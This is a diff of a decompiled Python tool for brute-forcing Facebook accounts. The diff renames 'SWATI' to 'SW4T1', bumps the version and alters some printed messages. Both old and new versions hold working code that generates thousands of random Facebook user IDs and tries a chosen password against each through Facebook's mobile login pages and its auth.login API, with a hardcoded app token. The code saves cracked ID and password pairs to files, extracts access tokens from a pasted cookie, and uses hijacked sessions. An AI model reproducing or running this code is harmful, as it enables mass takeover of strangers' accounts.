@@ -1,5 +1,5 @@
-#DECOMPILE BY SWATI
-#FILE NAME (SWATI-DEC)
+#DECOMPILE BY SW4T1
+#FILE NAME (SW4T1-DEC)
 W = '\033[97;1m'
 R = '\033[91;1m'
 G = '\033[92;1m'
@@ -131,7 +131,7 @@ def Public():
 	elif pil in ['2','02']:
 		try:
 			cookie=input(" [+] Cookie : ")
-			data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment ]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
+			data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
 			find_token = re.search("(EAA\w+)", data.text)
 			ken=open(".token.txt", "w").write(find_token.group(1))
 			print (" [] Login Successful")
@@ -220,7 +220,7 @@ def passmenu():
 		
 def first():
 	clear()
-	print(logo);print( '\n\033[1;94m [!] BRUTE  HAS BEEN  \n\033[1;96m [!] Turn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n')
+	print(logo);print( '\n\033[1;94m [!] BRUTE  HAS BEEN START \n\033[1;96m [!] Turn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -300,7 +300,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[Crack] %s/%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[Count] %s/%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -308,24 +308,24 @@ def crack(idf,pwv):
 	for pw in pwv:
 		try:
 			pw = pw.lower()
-			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment ]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://m.facebook.com/login/save-device/'"}
-			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment ]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;93m [SWATI-OK ] {idf} | {pw}')
+				print( f'\r\x1b[1;93m [SW4T1-OK ] {idf} | {pw}')
 				open('OK/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [SWATI-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [SW4T1-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/SWATI-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/SW4T1-OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -339,7 +339,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ Crack] %s/%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ Count] %s/%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -347,23 +347,23 @@ def free(idf,pwv):
 	for pw in pwv:
 		try:
 			pw = pw.lower()
-			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment ]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://mbasic.facebook.com/login/save-device/'"}
-			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment ]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;92m [SWATI-Ok] {idf} | {pw}')
+				rint( f'\r\x1b[1;92m [SW4T1-Ok] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [SWATI-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [SW4T1-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/SWATI.txt','a').write('%s\n' % wrt)
+				open('/sdcard/SW4T1.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -393,9 +393,9 @@ logo = """\033[1;32m
 \033[1;37m━▷ \033[0;37m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆    \033[1;39m◈✙◈    \033[1;37mAB KHANX
 \033[1;37m━▷ \033[0;37m𝙁𝘽 𝙂𝙍𝙊𝙐𝙋    \033[1;39m◈✙◈    \033[1;37mSWATI KI TRICKS
 \033[1;37m━▷ \033[0;37m𝙎𝘼𝙏𝙐𝙏𝘼𝙎     \033[1;39m◈✙◈    \033[0;97mFREE AND ENJOY
-\033[1;37m━▷ \033[0;37m𝙑𝙀𝙍𝙎𝙄𝙊𝙉     \033[1;37m◈✙◈    \033[1;37m2.6
+\033[1;37m━▷ \033[0;37m𝙑𝙀𝙍𝙎𝙄𝙊𝙉     \033[1;37m◈✙◈    \033[1;37m2.7
 --------------------------------------------------"""
- 
+
 class Main:
 	def __init__(self):
 		self.id = []
@@ -405,7 +405,7 @@ class Main:
 		os.system("clear")
 		print(logo)
 		
-		print("\033[1;33m----------------------------------------------------------------------------------------------------")
+		print("\033[1;33m--------------------------------------------------")
 		print("\033[1;37m     FIRST OF ALL SUBSCRIBE MY CHANNEL")
 		print("\033[1;33m--------------------------------------------------")
 		
@@ -417,15 +417,13 @@ class Main:
 			exit()
 		elif baloch in ["2", "02"]:
 			print("    CHAL BAGH 🤭")
-			os.system("xdg-open http://W7787729")
+			os.system("xdg-open http://Wa.me/+923017787729")
 			exit()
 		elif baloch in ["1", "01"]:
 			os.system("xdg-open https://www.youtube.com/@msstricks")
 			print("")
 			time.sleep(2.0)
-			print("\033[1;37m    Type Your Channel Name")
 			print("")
-			input("\n\033[1;32m  Type Name \033[1;34m━━>  \033[1;33m")
 			time.sleep(2.1)
 			print("")
 			print("\033[1;37m Successful ")
@@ -466,25 +464,25 @@ class Main:
 		xx = 999999999
 		idx = "100000" 
 		os.system("xdg-open https://www.youtube.com/@msstricks");print(logo)
-		limit = int(input(" \n\033[0;95m[+]\033[1;32m TOTAL IDS TO CRACK LIMIT 50000: "))
+		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50000: "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
 				__ = idx
 				self.id.append(__+str(_))
-			
-			print("\033[1;32m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+				
+			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
 				print("\n\033[1;32m [!] Ex(123456) FOR Old IDZ\033[1;37m ")
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
-				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[1;32m]"%(G,listpass))
+				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
 				print("\n\033[1;32m [+] CRACK HAS BEEN STARTED")
-				print(" \033[1;37m[+] OK OPEN 70% JUST NOW")
-				print(" [!] OFF ON AIRPLANE MODE")
+				print(" \033[1;37m[+] Note: Ok Open 70% JUST NOW")
+				print(" [!] OFF ON AIRPLANE MODE ")
 				print("\033[0;95m--------------------------------------------------")
 				print("\n")
 				print("\033[0;97m")
@@ -870,21 +868,21 @@ class Main:
 				"x-fb-net-hni": str(random.randint(20000, 40000)), 
 				"x-fb-connection-quality": "EXCELLENT",
 				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-				"user-agent": 'Mozilla/5.0 (Linux; Android 8.1.0; Infinix X5515F Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36',} 
+				"user-agent": 'Mozilla/5.0 (Linux; Android 10; SM-M105M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36', 
 				"content-type": "application/x-www-form-urlencoded", 
 				"x-fb-http-engine": "Liger"
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAA" in response.text:
-				print("\r \033[0;92m[SWATI-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[SW4T1-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-SWATI-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-SW4T1-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[SWATI-OK] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[SW4T1-OK] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-SWATI-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-SW4T1-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -896,24 +894,24 @@ class Main:
 		xx = 9999999999
 		idx = "10000" 
 		os.system('clear');print(logo)
-		limit = int(input("\n \033[0;95m[+]\033[1;32m TOTAL IDS TO CRACK LIMIT 50,000: "))
+		limit = int(input("\n \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
 				__ = idx
 				self.id.append(__+str(_))
 			
-			print("\033[1;32m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
 				print("\n\033[1;32m [!] Ex(123456) FOR Old IDZ\033[1;37m ")
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
-				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[1;32m]"%(G,listpass))
+				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
-				print("     \033[1;32m   FREE MODE ACTIVATE")
-				print("\n\033[0;94m [+] BRUTE HAS BEEN ")
+				print("     \033[0;93m   FREE MODE ACTIVATE")
+				print("\n\033[0;94m [+] BRUTE HAS BEEN START")
 				print(" \033[0;96m[+] Note: Ok Open 70% just now")
 				print(" [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS")
 				print("\033[0;94m--------------------------------------------")
@@ -1301,21 +1299,21 @@ class Main:
 				"x-fb-net-hni": str(random.randint(20000, 40000)), 
 				"x-fb-connection-quality": "EXCELLENT",
 				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-				"user-agent": 'Mozilla/5.0 (Linux; Android 8.1.0; Infinix X5515F Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36',}
+				"user-agent": 'Mozilla/5.0 (Linux; Android 10; SM-M105M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36', 
 				"content-type": "application/x-www-form-urlencoded", 
 				"x-fb-http-engine": "Liger"
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[SWATI-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[SW4T1-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-SWATI-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-SW4T1-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;93m[SWATI-OK] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;93m[SW4T1-OK] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-SWATI-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-SW4T1-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
